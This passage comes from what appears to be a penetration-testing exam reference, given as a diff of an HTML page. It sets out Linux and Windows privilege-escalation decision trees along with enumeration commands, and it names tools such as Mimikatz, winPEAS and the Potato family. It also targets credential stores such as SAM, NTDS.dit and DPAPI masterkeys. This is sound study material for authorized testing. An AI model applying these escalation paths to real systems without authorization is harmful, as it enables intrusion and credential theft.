+    ↓
+Cron + systemd timers
+    ↓
+Services
+    ↓
+PATH / library / module hijack
+    ↓
+NFS / mounts / Docker / LXC
+    ↓
+Credentials / SSH / history / configs
+    ↓
+D-Bus / Polkit / PackageKit / snap
+    ↓
+Custom SUID/application
+    ↓
+Kernel/package CVE
+</code></pre>
+</details>
+<details id="ref-12-31-linux-practical-attack-trees-finding-validation-path">
+<summary>➜ 12.31 Linux Practical Attack Trees --- Finding → Validation → Path</summary>
+<p><code>[LINUX:TREE]</code></p>
+<p>Use these <strong>after the 60-second pass</strong>. The objective is to turn a promising enumeration result into a short, testable hypothesis instead of rereading the entire Linux section.</p>
+<h3>Priority rule</h3>
+<pre class="ref-code"><code class="language-text">HIGH    = privileged execution + attacker-writable input + reliable trigger
+MEDIUM  = likely privileged execution but one prerequisite still unknown
+LOW     = version/CVE match only, noisy theory, or no confirmed trigger
+</code></pre>
+<h4>Tree A — <code>sudo -l</code> gives something interesting</h4>
+<pre class="ref-code"><code class="language-text">sudo -l
+  ↓
+Exact binary + allowed arguments + user/runas context
+  ↓
+NOPASSWD? SETENV? wildcard? user-controlled file/path?
+  ├─ Standard binary → check GTFOBins behavior for THIS sudo context
+  ├─ Script/interpreter → inspect script + imports + called commands
+  ├─ Service/package tool → identify privileged action it can invoke
+  └─ Restricted args → test whether paths/options can still be influenced
+  ↓
+Can controlled input reach a privileged execution primitive?
+  ├─ YES → validate with a harmless identity/read check first
+  └─ NO  → move on; do not force a sudo path that lacks control
+</code></pre>
+<p>Quick checks:</p>
+<pre class="ref-code"><code class="language-bash">sudo -l
+sudo -V | head
+command -V &lt;binary&gt;
+readlink -f "$(command -v &lt;binary&gt;)"
+</code></pre>
+<h4>Tree B — Known SUID/SGID binary</h4>
+<pre class="ref-code"><code class="language-text">find SUID/SGID
+  ↓
+Is binary expected on this distro?
+  ├─ YES → check known safe/escape behavior (GTFOBins/reference)
+  └─ NO  → treat as custom application → Tree C
+  ↓
+Does effective UID/GID survive the relevant operation?
+  ├─ YES → validate minimal privileged capability
+  └─ NO  → inspect wrapper/helper/dependencies instead
+</code></pre>
+<pre class="ref-code"><code class="language-bash">find / -perm -4000 -type f -ls 2&gt;/dev/nullfind / -perm -2000 -type f -ls 2&gt;/dev/null
+ls -l /path/to/binary
+file /path/to/binary
+</code></pre>
+<h4>Tree C — Custom SUID / privileged custom binary</h4>
+<pre class="ref-code"><code class="language-text">CUSTOM SUID / ROOT-EXECUTED BINARY
+  ↓
+file + strings + help/output
+  ↓
+Trace execution where permitted
+  ├─ execs command WITHOUT absolute path → PATH hijack candidate
+  ├─ loads writable .so/module/plugin → library/module hijack candidate
+  ├─ reads writable config/template → configuration injection candidate
+  ├─ writes predictable temp/file → symlink/TOCTOU candidate
+  ├─ invokes shell/interpreter → inspect arguments/environment
+  └─ processes attacker-controlled file/input → inspect parser/command use
+  ↓
+Confirm ownership + write permission + privileged trigger
+  ↓
+Test the smallest controlled behavior
+  ↓
+If control is proven → use the matching technique; otherwise abandon branch
+</code></pre>
+<pre class="ref-code"><code class="language-bash">file /path/to/binary
+ls -la /path/to/binary
+strings -a /path/to/binary | less
+strings -a /path/to/binary | grep -Ei 'system|popen|exec|/bin/|\.so|conf|tmp|python|perl|sh '
+readelf -d /path/to/binary 2&gt;/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /path/to/binary 2&gt;/dev/null
+strace -f -e trace=execve,openat,access /path/to/binary 2&gt;&amp;1 | less
+ltrace /path/to/binary 2&gt;&amp;1 | less
+</code></pre>
+<p><strong>Mental shortcut:</strong> <code>custom SUID → strings → trace → PATH/library/config/temp → permissions → trigger</code>.</p>
+<h4>Tree D — Linux capability on a binary</h4>
+<pre class="ref-code"><code class="language-text">getcap result
+  ↓
+Which capability?
+  ├─ cap_setuid            → can process change UID?
+  ├─ cap_dac_read_search   → can it read protected files?
+  ├─ cap_dac_override      → can it bypass file permission checks?
+  ├─ cap_sys_ptrace        → can it inspect a privileged process?
+  ├─ cap_sys_admin         → inspect exact binary functionality carefully
+  └─ other                 → read capability semantics before assuming impact
+  ↓
+Can THIS binary expose that capability through its normal features?
+  ├─ YES → validate a minimal capability-specific action
+  └─ NO  → capability exists but may not be useful
+</code></pre>
+<pre class="ref-code"><code class="language-bash">getcap -r / 2&gt;/dev/null
+getcap /path/to/binary
+capsh --print 2&gt;/dev/null
+</code></pre>
+<h4>Tree E — Root cron job / scheduled script</h4>
+<pre class="ref-code"><code class="language-text">ROOT CRON / PERIODIC PROCESS
+  ↓
+What exact command runs?
+  ↓
+Can I modify...
+  ├─ executed script/binary?       → direct privileged execution path
+  ├─ parent directory?             → replacement/symlink possibility
+  ├─ called relative command?      → PATH hijack possibility
+  ├─ wildcard-controlled directory?→ option/argument injection possibility
+  ├─ sourced config/environment?   → configuration/module path
+  └─ temp/output path?             → symlink/TOCTOU possibility
+  ↓
+Can I observe the trigger with pspy?
+  ├─ YES → verify cadence + executing UID + exact argv
+  └─ NO  → keep hypothesis tentative
+</code></pre>
+<pre class="ref-code"><code class="language-bash">cat /etc/crontab
+ls -la /etc/cron.d /etc/cron.* 2&gt;/dev/null
+crontab -l 2&gt;/dev/null
+./pspy64
+</code></pre>
+<h4>Tree F — systemd service/timer looks writable</h4>
+<pre class="ref-code"><code class="language-text">SYSTEMD FINDING
+  ↓
+systemctl cat &lt;unit&gt; + show properties
+  ↓
+Identify what root actually executes
+  ↓
+Can current user write...
+  ├─ unit file?             → unit configuration control
+  ├─ ExecStart target?      → executable/script control
+  ├─ EnvironmentFile?       → environment/argument control
+  ├─ WorkingDirectory?      → relative-path/module possibilities
+  ├─ referenced config?     → application-specific control
+  └─ parent directory?      → replacement/symlink possibility
+  ↓
+Can the unit be started/restarted OR is a timer already triggering it?
+  ├─ YES → HIGH priority; validate exact controlled input
+  └─ NO  → determine next natural trigger before modifying anything
+</code></pre>
+<pre class="ref-code"><code class="language-bash">systemctl cat &lt;unit&gt;
+systemctl show &lt;unit&gt; -p User -p Group -p ExecStart -p EnvironmentFiles -p WorkingDirectory
+systemctl status &lt;unit&gt;
+systemctl list-timers --all
+ls -l /path/from/ExecStart /path/from/EnvironmentFile 2&gt;/dev/null
+namei -l /path/from/ExecStart 2&gt;/dev/null
+</code></pre>
+<p><strong>Mental shortcut:</strong> <code>systemd → unit → target/config → writable? → privileged? → trigger?</code>.</p>
+<h4>Tree G — Relative command / PATH hijack candidate</h4>
+<pre class="ref-code"><code class="language-text">PRIVILEGED PROGRAM CALLS "tool" INSTEAD OF /full/path/tool
+  ↓
+What PATH does the privileged context use?
+  ↓
+Is a directory before the legitimate binary writable?
+  ├─ YES → candidate
+  └─ NO  → not a practical PATH hijack
+  ↓
+Can privileged program be triggered reliably?
+  ├─ YES → validate command resolution
+  └─ NO  → lower priority
+</code></pre>
+<pre class="ref-code"><code class="language-bash">strings /path/to/privileged-binary | grep -E '(^| )([a-zA-Z0-9_.-]+)( |$)'
+strace -f -e trace=execve /path/to/privileged-binary 2&gt;&amp;1
+printf '%s\n' "$PATH" | tr ':' '\n'
+namei -l /candidate/directory
+</code></pre>
+<p>Do <strong>not</strong> change PATH blindly. First prove the privileged process resolves a relative command through an attacker-writable directory.</p>
+<h4>Tree H — Shared library / language module / plugin hijack</h4>
+<pre class="ref-code"><code class="language-text">PRIVILEGED PROGRAM LOADS DEPENDENCY
+  ↓
+Native ELF or interpreter/runtime?
+  ├─ ELF → NEEDED / RPATH / RUNPATH / loader search
+  ├─ Python → imports + sys.path / PYTHONPATH + writable package/module
+  ├─ Perl/Ruby/Node/Java → equivalent library/module search path
+  └─ App plugin → plugin/config directory ownership
+  ↓
+Can user write a searched location or referenced dependency?
+  ↓
+Will privileged process load it during a reliable trigger?
+  ├─ YES → HIGH priority
+  └─ NO  → informational only
+</code></pre>
+<pre class="ref-code"><code class="language-bash">readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /path/to/binary
+find / -type d -writable 2&gt;/dev/null | head -100
+python3 -c 'import sys; print("\n".join(sys.path))' 2&gt;/dev/null
+</code></pre>
+<h4>Tree I — Writable root-owned script/configuration</h4>
+<pre class="ref-code"><code class="language-text">WRITABLE FILE FOUND
+  ↓
+Who consumes it?
+  ↓
+Does a privileged process actually execute/read it?
+  ├─ NO → probably noise
+  └─ YES
+       ↓
+When/how is it triggered?
+       ↓
+Can one controlled value alter command/module/file behavior?
+       ├─ YES → validate minimal effect
+       └─ NO  → inspect downstream dependencies instead
+</code></pre>
+<pre class="ref-code"><code class="language-bash">ls -la /path/to/file
+namei -l /path/to/file
+ps auxww | grep -F '/path/to/file'
+grep -R -F '/path/to/file' /etc/systemd /etc/cron* /etc/init.d 2&gt;/dev/null
+</code></pre>
+<h4>Tree J — Docker / LXC / LXD / host-resource control</h4>
+<pre class="ref-code"><code class="language-text">CONTAINER / GROUP MEMBERSHIP
+  ↓
+What host resource is exposed?
+  ├─ docker.sock / docker group
+  ├─ privileged container
+  ├─ host filesystem mount
+  ├─ host PID namespace
+  ├─ powerful capabilities
+  └─ LXC/LXD management socket/group
+  ↓
+Can current identity ask the runtime to access host-controlled resources?
+  ├─ YES → treat as host privilege boundary issue
+  └─ NO  → being "inside Docker" alone is not escalation
+</code></pre>
+<pre class="ref-code"><code class="language-bash">id
+ls -l /var/run/docker.sock 2&gt;/dev/null
+docker info 2&gt;/dev/null
+docker ps 2&gt;/dev/null
+cat /proc/1/cgroup
+findmnt
+cat /proc/self/status | grep '^Cap'
+</code></pre>
+<h4>Tree K — NFS <code>no_root_squash</code> / network filesystem</h4>
+<pre class="ref-code"><code class="language-text">NFS EXPORT
+  ↓
+Export writable from attacker-controlled client?
+  ↓
+no_root_squash or equivalent trust weakness?
+  ↓
+UID/GID semantics understood?
+  ↓
+Can a privileged-owned file/permission be created on the export?
+  ├─ YES → strong escalation candidate
+  └─ NO  → ordinary writable share only
+</code></pre>
+<pre class="ref-code"><code class="language-bash">cat /etc/exports 2&gt;/dev/null
+mount | grep -Ei 'nfs|cifs'
+findmnt -t nfs,nfs4,cifs
+</code></pre>
+<h4>Tree L — Kernel/package exploit: last resort</h4>
+<pre class="ref-code"><code class="language-text">VERSION MATCH
+  ↓
+Exact distro build + package/kernel revision
+  ↓
+Architecture + required config/module/feature
+  ↓
+Exploit prerequisite reachable as current user?
+  ↓
+Mitigations/backports checked?
+  ↓
+Public reproducer matches target?
+  ├─ YES → consider only after stable config/service paths
+  └─ NO  → discard version-only match
+</code></pre>
+<h3>Linux 10-second "worth pursuing?" test</h3>
+<p>For any candidate, answer these four questions:</p>
+<pre class="ref-code"><code class="language-text">1. What privileged process/user performs the action?
+2. What exact input/file/path do I control?
+3. What causes the privileged process to consume my input?
+4. What minimal test proves the control without breaking the host?
+</code></pre>
+<p>If you cannot answer <strong>1–3</strong>, keep enumerating instead of exploiting.</p>
+</details>
+<hr/>
+<details id="ref-13-1-automated-tools-run-these-first">
+<summary>⚙ 13.1 Automated Tools --- Run These First</summary>
+<pre class="ref-code"><code class="language-powershell">.\winPEASx64.exe
+.\Seatbelt.exe -group=all
+.\SharpUp.exe audit
+.\PrivescCheck.ps1
+.\Watson.exe
+
+whoami /all
+whoami /priv
+whoami /groups
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+tasklist /svc
+schtasks /query /fo LIST /v
+net user
+net localgroup administrators
+</code></pre>
+<p>Also know:</p>
+<pre class="ref-code"><code class="language-text">AccessChk
+Process Explorer
+Procmon
+LOLBAS
+SharpDPAPI
+</code></pre>
+</details>
+<details id="ref-13-2-services-acl-binary-registry-path">
+<summary>🛠️ 13.2 Services --- ACL + Binary + Registry + Path</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ FIRST CHOICE · <code>[REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]</code></p>
+</blockquote>
+<p><code>[WIN:SERVICE]</code></p>
+<pre class="ref-code"><code class="language-powershell">Get-CimInstance Win32_Service |
+  Select Name,StartMode,State,StartName,PathName
+
+sc.exe query
+sc.exe qc &lt;SERVICE&gt;
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] Unquoted service path</li>
+<li>[ ] Writable executable</li>
+<li>[ ] Writable parent directory</li>
+<li>[ ] Weak service ACL</li>
+<li>[ ] Weak registry ACL</li>
+<li>[ ] Change-config/start permissions</li>
+<li>[ ] SYSTEM service account</li>
+<li>[ ] DLL/module dependencies</li>
+</ul>
+<p>Use AccessChk to validate permissions rather than relying only on
+WinPEAS.</p>
+</details>
+<details id="ref-13-3-scheduled-tasks-autoruns">
+<summary>📋 13.3 Scheduled Tasks &amp; Autoruns</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ when SYSTEM/high-privileged target is writable · <code>[REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]</code></p>
+</blockquote>
+<p><code>[WIN:TASK]</code></p>
+<pre class="ref-code"><code class="language-cmd">schtasks /query /fo LIST /v
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] SYSTEM task</li>
+<li>[ ] Writable executable/script</li>
+<li>[ ] Writable working directory</li>
+<li>[ ] DLL/module load</li>
+<li>[ ] User-controlled arguments</li>
+<li>[ ] Startup/logon trigger</li>
+<li>[ ] Registry autorun binary writable</li>
+</ul>
+</details>
+<details id="ref-13-4-token-impersonation-potato-decision-tree">
+<summary>POTATO 13.4 Token Impersonation / Potato Decision Tree</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE MANUAL PATH</strong> · ✓ when prerequisites match · <code>[REQ:LOCAL_SHELL] [REQ:PRIVILEGE] [REQ:EXACT_BUILD]</code></p>
+</blockquote>
+<p><code>[WIN:SEIMPERSONATE]</code></p>
+<pre class="ref-code"><code class="language-cmd">whoami /priv
+whoami /groups
+</code></pre>
+<p>If relevant:</p>
+<pre class="ref-code"><code class="language-text">SeImpersonatePrivilege
+SeAssignPrimaryTokenPrivilege
+        ↓
+Windows build
+        ↓
+Service/RPC prerequisites
+        ↓
+Select compatible technique
+</code></pre>
+<p>Know the families:</p>
+<pre class="ref-code"><code class="language-text">GodPotato
+PrintSpoofer
+RoguePotato
+JuicyPotato
+SweetPotato
+</code></pre>
+<p>Do not assume one Potato works on every Windows release.</p>
+</details>
+<details id="ref-13-5-named-pipes-ipc">
+<summary>🔌 13.5 Named Pipes / IPC</summary>
+<p><code>[WIN:PIPE]</code></p>
+<pre class="ref-code"><code class="language-cmd">dir \\.\pipe\
+</code></pre>
+<p>PowerShell:</p>
+<pre class="ref-code"><code class="language-powershell">Get-ChildItem \\.\pipe\
+</code></pre>
+<p>Investigate:</p>
+<ul>
+<li>[ ] Pipe name</li>
+<li>[ ] Owning process</li>
+<li>[ ] Security descriptor</li>
+<li>[ ] Client/server role</li>
+<li>[ ] Impersonation</li>
+<li>[ ] Privileged service account</li>
+<li>[ ] Triggerable privileged operation</li>
+</ul>
+<p>Use Procmon/Process Explorer to correlate pipe activity with processes.</p>
+</details>
+<details id="ref-13-6-dpapi-credential-stores">
+<summary>🔑 13.6 DPAPI / Credential Stores</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE MANUAL ENUMERATION</strong> · △ context-dependent · <code>[REQ:LOCAL_SHELL]</code></p>
+</blockquote>
+<p><code>[WIN:DPAPI]</code></p>
+<p>Inspect:</p>
+<pre class="ref-code"><code class="language-text">Credential Manager
+Windows Credential Files
+DPAPI masterkeys
+Browser credential stores
+Saved RDP credentials
+Application secrets
+Certificates/private keys
+</code></pre>
+<p>Tools to know:</p>
+<pre class="ref-code"><code class="language-text">SharpDPAPI
+Mimikatz dpapi::
+Seatbelt
+</code></pre>
+<p>Mental model:</p>
+<pre class="ref-code"><code class="language-text">Credential blob
+      ↓
+DPAPI protection
+      ↓
+Masterkey
+      ↓
+User/machine/domain context
+      ↓
+Decryptable secret
+</code></pre>
+</details>
+<details id="ref-13-7-windows-privileges-don-t-stop-at-seimpersonate">
+<summary>💾 13.7 Windows Privileges --- Don't Stop at SeImpersonate</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE MANUAL VALIDATION</strong> · ✓/△ depends on the exact enabled privilege · <code>[REQ:LOCAL_SHELL]</code></p>
+</blockquote>
+<p><code>[WIN:PRIV]</code></p>
+<pre class="ref-code"><code class="language-cmd">whoami /priv
+</code></pre>
+<p>Review:</p>
+<pre class="ref-code"><code class="language-text">SeImpersonatePrivilege
+SeAssignPrimaryTokenPrivilege
+SeBackupPrivilege
+SeRestorePrivilege
+SeDebugPrivilege
+SeTakeOwnershipPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeCreateSymbolicLinkPrivilege
+</code></pre>
+<p>For each privilege ask:</p>
+<blockquote>
+<p>What exact protected operation does this privilege permit in the
+current context?</p>
+</blockquote>
+</details>
+<details id="ref-13-8-laps-local-administrator-credential-discovery">
+<summary>🗄️ 13.8 LAPS / Local Administrator Credential Discovery</summary>
+<p><code>[WIN:LAPS]</code></p>
+<p>Check for:</p>
+<pre class="ref-code"><code class="language-text">Windows LAPS
+Legacy Microsoft LAPS
+Delegated read permissions
+Computer-object password attributes
+Password expiration metadata
+</code></pre>
+<p>In AD:</p>
+<pre class="ref-code"><code class="language-text">Who can read the LAPS password?
+Who can modify the computer object?
+Does the current principal have delegated read rights?
+</code></pre>
+<p>Do not assume "LAPS exists" means the current user can read the
+password.</p>
+</details>
+<details id="ref-13-9-dll-exe-path-hijacking">
+<summary>📂 13.9 DLL / EXE / PATH Hijacking</summary>
+<p><code>[WIN:DLL]</code></p>
+<p>Use:</p>
+<pre class="ref-code"><code class="language-cmd">where.exe &lt;binary&gt;
+icacls &lt;directory&gt;
+</code></pre>
+<p>With Procmon look for:</p>
+<pre class="ref-code"><code class="language-text">NAME NOT FOUND
+PATH NOT FOUND
+ACCESS DENIED
+</code></pre>
+<p>Check:</p>
+<pre class="ref-code"><code class="language-text">DLL search order
+Writable application directories
+Writable PATH directories
+Missing DLLs
+Side-loading
+Unquoted paths
+Writable working directories
+</code></pre>
+</details>
+<details id="ref-13-10-registry-acl-file-permission-methodology">
+<summary>↔ 13.10 Registry / ACL / File Permission Methodology</summary>
+<p><code>[WIN:REGISTRY]</code></p>
+<pre class="ref-code"><code class="language-cmd">reg query HKLM\SOFTWARE
+reg query HKCU\SOFTWARE
+icacls "C:\path"
+</code></pre>
+<p>Ask:</p>
+<pre class="ref-code"><code class="language-text">Can I modify the executable?
+Can I modify its parent directory?
+Can I change the service configuration?
+Can I modify a registry value that a privileged process consumes?
+Can I influence a DLL/config/plugin?
+</code></pre>
+</details>
+<details id="ref-13-11-sebackup-serestore-sensitive-file-access">
+<summary>🔐 13.11 SeBackup / SeRestore / Sensitive File Access</summary>
+<p><code>[WIN:BACKUP]</code></p>
+<p>Relevant privileges:</p>
+<pre class="ref-code"><code class="language-text">SeBackupPrivilege
+SeRestorePrivilege
+</code></pre>
+<p>Investigate whether the context allows access to:</p>
+<pre class="ref-code"><code class="language-text">SAM
+SYSTEM
+SECURITY
+NTDS.dit
+shadow copies
+protected application files
+registry hives
+</code></pre>
+<p>The key is to understand the privilege's semantics rather than
+memorizing a single command.</p>
+</details>
+<details id="ref-13-12-kernel-driver-cve-triage">
+<summary>💣 13.12 Kernel / Driver CVE Triage</summary>
+<blockquote>
+<p>✅ <strong>MANUAL EXPLOITATION MAY BE EXAM-COMPATIBLE</strong> · ! LAST RESORT · <code>[REQ:LOCAL_SHELL] [REQ:EXACT_BUILD] [REQ:CONFIG] [REQ:SAFE_RECOVERY]</code></p>
+</blockquote>
+<p><code>[WIN:KERNEL]</code></p>
+<pre class="ref-code"><code class="language-cmd">systeminfo
+powershell -NoProfile -Command "Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20 HotFixID,InstalledOn,Description"
+driverquery /v
+
+REM △ LEGACY FALLBACK — WMIC is deprecated/absent on newer Windows:
+wmic qfe list brief
+</code></pre>
+<p>Workflow:</p>
+<pre class="ref-code"><code class="language-text">OS name
+  ↓
+Build number
+  ↓
+Patch level
+  ↓
+Installed drivers
+  ↓
+Exact affected build
+  ↓
+Exploit prerequisites
+  ↓
+Mitigations
+  ↓
+Public PoC
+</code></pre>
+<p>Use Microsoft MSRC + NVD + vendor advisories.</p>
+</details>
+<details id="ref-13-13-2026-windows-ad-cve-reference-validate-before-use">
+<summary>📌 13.13 2026 Windows / AD CVE Reference --- Validate Before Use</summary>
+<p><span class="v16-ref-tier v16-ref-cond">● CONDITIONAL</span> Rule: the product area in a CVE title does <strong>not</strong> tell you LOCAL vs REMOTE. Fill the CVE Context Card before acting. <strong>CVE-2026-26128 is LOCAL EoP (authorized low-priv attacker), not remote SMB RCE; port 445 alone is not a prerequisite.</strong></p>
+<hr/>
+<p>CVE                    Area                   Checklist action</p>
+<hr/>
+<p>CVE-2026-26128         Windows SMB Server     Verify exact Windows
+build and SMB context</p>
+<p>CVE-2026-62752         Windows Kerberos       Verify exact build and
+required authentication
+context</p>
+<p>CVE-2026-62773         Windows Kerberos       Verify exact build and
+trigger conditions</p>
+<p>CVE-2026-62766         Windows Kerberos       Verify exact build and
+trigger conditions</p>
+<p>CVE-2026-27912         Windows Kerberos       Check
+network/authentication
+prerequisites</p>
+<p>CVE-2026-47288         Windows Kerberos       Check adjacent-network
+prerequisites</p>
+<p>CVE-2026-54121         AD CS                  Check
+certificate-service
+configuration</p>
+<h2>CVE-2026-55001         Active Directory       Check affected AD
+configuration/build</h2>
+<p>Primary sources:</p>
+<ul>
+<li>https://msrc.microsoft.com/</li>
+<li>https://nvd.nist.gov/</li>
+</ul>
+<blockquote>
+<p>Keep this as a triage index. Do not infer exploitability from a CVE
+title.</p>
+</blockquote>
+</details>
+<details id="ref-13-14-windows-privesc-decision-tree">
+<summary>★ 13.14 Windows PrivEsc Decision Tree</summary>
+<p><code>[WIN:TREE]</code></p>
+<pre class="ref-code"><code class="language-text">LOW PRIV USER
+    ↓
+whoami /priv + groups
+    ↓
+Services
+    ↓
+Scheduled Tasks
+    ↓
+Writable Files / Directories
+    ↓
+Registry / Autoruns
+    ↓
+DLL / EXE / PATH Hijacking
+    ↓
+Named Pipes / IPC
+    ↓
+Token impersonation
+    ↓
+DPAPI / Credential Stores
+    ↓
+LAPS / Local Admin Secrets
+    ↓
+Backup/Restore/Debug privileges
+    ↓
+Drivers / Kernel CVE
+</code></pre>
+</details>
+<details id="ref-13-15-windows-practical-attack-trees-finding-validation-path">
+<summary>➜ 13.15 Windows Practical Attack Trees --- Finding → Validation → Path</summary>
+<p><code>[WIN:TREE]</code></p>
+<p>Use these after the Windows 60-second pass. Prioritize a path only when you can identify <strong>privileged context + controllable object + trigger</strong>.</p>
+<h3>Priority rule</h3>
+<pre class="ref-code"><code class="language-text">HIGH    = SYSTEM/admin execution + writable/configurable object + restart/trigger
+MEDIUM  = privilege/control exists but trigger or prerequisite is uncertain
+LOW     = product/build match only or scanner finding without confirmed control
+</code></pre>
+<h4>Tree A — <code>SeImpersonatePrivilege</code> / <code>SeAssignPrimaryTokenPrivilege</code></h4>
+<pre class="ref-code"><code class="language-text">whoami /priv
+  ↓
+SeImpersonate OR SeAssignPrimaryToken enabled?
+  ├─ NO → move to other privileges
+  └─ YES
+       ↓
+Exact Windows build + current service identity
+       ↓
+Which coercion/impersonation prerequisite is available?
+       ├─ Compatible named-pipe/service path → PrintSpoofer-style family
+       ├─ Compatible RPC/DCOM path          → Potato-family candidate
+       └─ No usable trigger                 → privilege alone is not enough
+       ↓
+Choose technique for THIS build/context
+       ↓
+Validate with `whoami` / token identity before doing anything else
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">whoami /all
+whoami /priv
+systeminfo
+whoami /groups
+</code></pre>
+<p><strong>Mental shortcut:</strong> <code>SeImpersonate → build → service/RPC prerequisite → compatible family → identity check</code>.</p>
+<h4>Tree B — Weak Windows service</h4>
+<pre class="ref-code"><code class="language-text">SERVICE RUNS AS SYSTEM / PRIVILEGED ACCOUNT
+  ↓
+sc qc + service ACL + binary/path ACL
+  ↓
+Can user control...
+  ├─ service configuration?  → binPath/config-change path
+  ├─ service executable?     → executable replacement path
+  ├─ parent directory?       → replacement/path opportunity
+  ├─ registry parameters?    → service-specific config path
+  ├─ unquoted path segment?  → Tree C
+  └─ DLL/config dependency?  → Tree E
+  ↓
+Can service be restarted OR will it naturally restart?
+  ├─ YES → HIGH priority
+  └─ NO  → determine realistic trigger before modification
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">sc qc &lt;SERVICE&gt;
+sc query &lt;SERVICE&gt;
+icacls "C:\path\to\service.exe"
+icacls "C:\path\to"
+</code></pre>
+<p>Use AccessChk where available to confirm service-control permissions rather than trusting scanner output alone.</p>
+<h4>Tree C — Unquoted service path</h4>
+<pre class="ref-code"><code class="language-text">UNQUOTED PATH WITH SPACES
+  ↓
+Service account privileged?
+  ↓
+Enumerate each executable resolution candidate
+  ↓
+Can user CREATE/WRITE any earlier candidate location?
+  ├─ YES → candidate
+  └─ NO  → not exploitable merely because path is unquoted
+  ↓
+Can service be restarted / machine reboot naturally?
+  ├─ YES → validate path resolution safely
+  └─ NO  → lower priority
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">sc qc &lt;SERVICE&gt;
+icacls "C:\"
+icacls "C:\Program Files"
+icacls "C:\Program Files\Vendor App"
+</code></pre>
+<h4>Tree D — Scheduled task</h4>
+<pre class="ref-code"><code class="language-text">TASK RUNS AS SYSTEM / ADMIN
+  ↓
+What executable/script/arguments run?
+  ↓
+Can current user write...
+  ├─ executable/script?
+  ├─ working directory?
+  ├─ referenced config/file?
+  ├─ relative command/DLL search location?
+  └─ arguments through another controlled file?
+  ↓
+Can task be run manually OR does trigger occur soon?
+  ├─ YES → HIGH priority
+  └─ NO  → record trigger and continue enumeration
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">schtasks /query /fo LIST /v
+icacls "C:\path\to\task.exe"
+</code></pre>
+<p>PowerShell:</p>
+<pre class="ref-code"><code class="language-powershell">Get-ScheduledTask | ForEach-Object {
+  $t = $_
+  $t.Actions | Select-Object @{n='Task';e={$t.TaskName}}, Execute, Arguments, WorkingDirectory
+}
+</code></pre>
+<h4>Tree E — DLL / EXE / PATH hijack</h4>
+<pre class="ref-code"><code class="language-text">PRIVILEGED PROCESS ATTEMPTS LOAD/EXECUTE
+  ↓
+Procmon: NAME NOT FOUND / PATH NOT FOUND / search behavior
+  ↓
+Is searched location writable by current user?
+  ├─ NO → discard
+  └─ YES
+       ↓
+Does privileged process load from that location before trusted location?
+       ↓
+Can process/service/task be triggered reliably?
+       ├─ YES → strong candidate
+       └─ NO  → lower priority
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">where.exe &lt;binary&gt;
+icacls "C:\candidate\directory"
+</code></pre>
+<p>Procmon filters worth using:</p>
+<pre class="ref-code"><code class="language-text">Process Name is &lt;target&gt;
+Result is NAME NOT FOUND
+Result is PATH NOT FOUND
+Operation is CreateFile / Load Image / Process Create
+</code></pre>
+<h4>Tree F — Registry / Autorun / installer policy</h4>
+<pre class="ref-code"><code class="language-text">REGISTRY FINDING
+  ↓
+AlwaysInstallElevated?
+  ├─ both HKCU + HKLM enabled → privileged installer policy candidate
+  └─ otherwise continue
+  ↓
+Autorun/service registry entry points to privileged executable?
+  ↓
+Can user change registry value OR write referenced binary?
+  ├─ YES → candidate
+  └─ NO  → informational only
+  ↓
+Is there a realistic logon/start/restart trigger?
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+</code></pre>
+<h4>Tree G — <code>SeBackupPrivilege</code> / <code>SeRestorePrivilege</code></h4>
+<pre class="ref-code"><code class="language-text">SENSITIVE FILE PRIVILEGE
+  ↓
+Is privilege present/enabled in current token?
+  ↓
+What protected material is reachable?
+  ├─ local SAM + SYSTEM
+  ├─ SECURITY / application secret stores
+  ├─ shadow-copy content
+  └─ domain-controller NTDS only if actually on/able to access a DC context
+  ↓
+Can data be copied/read using the privilege?
+  ├─ YES → credential/access path
+  └─ NO  → privilege may be filtered/unusable in current context
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">whoami /priv
+vssadmin list shadows
+reg query HKLM\SAM
+</code></pre>
+<p>Avoid assuming <code>SeBackupPrivilege = SYSTEM</code>; first establish what protected data it lets the current process read.</p>
+<h4>Tree H — <code>SeDebugPrivilege</code> / ownership-style privileges</h4>
+<pre class="ref-code"><code class="language-text">SeDebug / SeTakeOwnership / related privilege
+  ↓
+Is it enabled and usable by current token?
+  ↓
+What privileged process/object is actually accessible?
+  ↓
+Can the privilege produce a meaningful read/write/control primitive?
+  ├─ YES → validate minimal primitive
+  └─ NO  → privilege name alone is not an exploit
+</code></pre>
+<pre class="ref-code"><code class="language-cmd">whoami /priv
+tasklist /v
+</code></pre>
+<h4>Tree I — DPAPI / Credential Manager / saved secrets</h4>
+<pre class="ref-code"><code class="language-text">CREDENTIAL ARTIFACT FOUND
+  ↓
+What encryption/protection context?
+  ├─ current-user DPAPI + current logon context
+  ├─ machine DPAPI / SYSTEM context
+  ├─ browser/app-specific encryption
+  └─ plaintext/config/token already usable
+  ↓
+Do I possess the required masterkey/logon context?
